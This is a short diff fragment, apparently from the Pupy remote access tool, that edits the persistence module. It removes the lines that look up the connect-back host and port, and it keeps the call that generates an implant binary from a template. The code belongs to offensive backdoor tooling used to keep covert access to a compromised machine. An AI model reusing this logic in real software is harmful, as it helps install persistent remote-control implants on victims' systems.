@@ -81,10 +81,6 @@ class PersistenceModule(PupyModule):
                 exebuff=f.read()
             self.info("loading %s ..."%args.exe)
         else:
-            #retrieving conn info
-            res=self.client.conn.modules['pupy'].get_connect_back_host()
-            host, port=res.rsplit(':',1)
-            #generating exe
             exebuff, tpl, _ = pupygen.generate_binary_from_template(
                 self.client.get_conf(),
                 self.client.desc['platform'],
